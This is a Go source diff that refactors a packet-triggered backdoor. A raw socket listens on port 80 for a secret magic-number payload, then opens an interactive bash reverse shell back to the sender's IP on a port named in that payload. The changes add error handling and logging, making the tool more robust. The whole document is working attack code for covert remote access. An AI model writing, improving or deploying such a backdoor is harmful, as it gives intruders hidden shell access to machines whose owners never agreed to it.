@@ -2,9 +2,11 @@ package main
 
 import (
 	"fmt"
+	"log"
 	"net"
 	"os"
 	"os/exec"
+	"strconv"
 	"strings"
 	"sync"
 	"syscall"
@@ -13,28 +15,31 @@ import (
 	"github.com/google/gopacket/layers"
 )
 
-var packets = make(chan gopacket.Packet, 10)
-
 // MagicNumber Listen to packets whose payload starts with this number
 var MagicNumber = "xVUOcOIljRTgY2MWMK0piQ=="
 
 func main() {
-	var listenGroup, workerGroup sync.WaitGroup
+	var wg sync.WaitGroup
 
-	listenGroup.Add(1)
-	go listen(80, &listenGroup, &workerGroup)
-	listenGroup.Wait()
+	wg.Add(1)
+	go listen(80, &wg)
+	wg.Wait()
 }
 
-func listen(port layers.TCPPort, listenGroup *sync.WaitGroup, workerGroup *sync.WaitGroup) {
-	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
+func listen(port layers.TCPPort, wg *sync.WaitGroup) {
+	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
+	if err != nil {
+		log.Fatalf("Faild to open raw socket: %s", err)
+	}
 	f := os.NewFile(uintptr(fd), fmt.Sprintf("fd %d", fd))
+	defer f.Close()
 
 	for {
 		ipBuf := make([]byte, 1024)
 		numRead, err := f.Read(ipBuf)
 		if err != nil {
-			fmt.Println(err)
+			log.Printf("Failed to read from socket: %s", err)
+			continue
 		}
 		packet := gopacket.NewPacket(ipBuf[:numRead], layers.LayerTypeIPv4, gopacket.Default)
 
@@ -43,42 +48,47 @@ func listen(port layers.TCPPort, listenGroup *sync.WaitGroup, workerGroup *sync.
 			if tcp.DstPort == port {
 				payload := string(tcp.Payload)
 				if strings.HasPrefix(payload, MagicNumber) {
-					workerGroup.Add(1)
-					go handlePacket(packet, workerGroup)
+					go handlePacket(packet)
 				}
 			}
 		}
 	}
-	workerGroup.Wait()
-	listenGroup.Done()
 }
 
-func handlePacket(packet gopacket.Packet, wg *sync.WaitGroup) {
-	ip, _ := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
-	tcp, _ := packet.Layer(layers.LayerTypeTCP).(*layers.TCP)
-	srcIP := ip.SrcIP
-	srcPort := tcp.SrcPort
-	fmt.Println(srcIP)
-	fmt.Println(srcPort)
-	addr := srcIP.String()
-	fmt.Println(addr)
-	addr += ":" + strings.TrimSpace(strings.TrimPrefix(string(tcp.Payload), MagicNumber))
-	fmt.Println(addr)
+func handlePacket(packet gopacket.Packet) {
+	ip, success := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
+	if !success {
+		log.Printf("Failed to get IP layer")
+		return
+	}
+	tcp, success := packet.Layer(layers.LayerTypeTCP).(*layers.TCP)
+	if !success {
+		log.Printf("Failed to get TCP layer")
+		return
+	}
+	host := ip.SrcIP.String()
+	port := strings.TrimSpace(strings.TrimPrefix(string(tcp.Payload), MagicNumber))
+	if _, err := strconv.Atoi(port); err != nil {
+		log.Printf("Failed to convert to port: %s", port)
+		return
+	}
+	addr := net.JoinHostPort(host, port)
 	runReverseShell(addr)
-	wg.Done()
 }
 
 func runReverseShell(addr string) {
+	log.Printf("Connection to %s...", addr)
 	conn, err := net.Dial("tcp", addr)
-	fmt.Println("Connection: ", conn)
-	fmt.Println("Error: ", err)
+	if err != nil {
+		log.Printf("Failed to open connection: %s", err)
+	}
+	defer conn.Close()
 	if conn != nil {
 		shellCmd := exec.Command("/bin/bash", "-i", "-c", "script /dev/null")
 		shellCmd.Stdin = conn
 		shellCmd.Stdout = conn
 		shellCmd.Stderr = conn
 		shellCmd.Run()
-		fmt.Println("Done!")
-		conn.Close()
+		log.Printf("Closing connection to %s...", addr)
 	}
 }
